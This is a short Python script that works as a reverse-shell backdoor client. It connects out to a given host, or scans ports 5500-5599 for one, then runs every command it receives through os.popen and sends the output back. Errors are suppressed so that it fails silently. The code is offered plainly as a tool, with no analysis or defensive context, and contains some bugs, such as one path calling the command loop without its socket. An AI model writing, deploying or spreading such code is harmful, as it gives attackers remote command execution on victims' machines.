import socket, os, sys, signal

try:
    def main(client):
        while True:
            try:            
                it = client.recv(4096)
                it = it.decode('utf-8')
                commandum = it
                if 'DISCONNECT' in it:
                    break
                try:
                    result = os.popen(commandum).read()
                    result = result.encode()
                except:
                    result = "FATAL EWWOW"
                client.send(result)
            except:
                break

    def GetOptions():
        try:
            host = sys.argv[1]
        except:
            host = input ("\nhost : ")
            if len(host) == 0:
                host = '127.0.0.1'
        try:
            int(sys.argv[2])
            port = sys.argv[2]
            PingPort(host, port)   
        except:
            try:
                if sys.argv[2] == '-r' or '-range' or 'range' or '--range':
                    PingPortRange(host) 
            except IndexError:
                pass
            port = (input ("\nport : "))
            if len(port) == 0:
                PingPortRange(host)
            else:
                PingPort(host, port)     

    def PingPortRange(host):
        for p in range(5500,5600):
            try:
                client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                client.settimeout(0.0000001)
                client.connect ((host, (p)))
                client.settimeout(None)
                main(client)
                break
            except BaseException:
                pass
        exit(-1)
                

    def PingPort(host, port):
        try:
            client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client.settimeout(0.1)
            client.connect ((host, int(port)))
            client.settimeout(None)
            main()
        except BaseException:
            pass
    GetOptions()
except BaseException:
    exit(-1)

#version 1.3
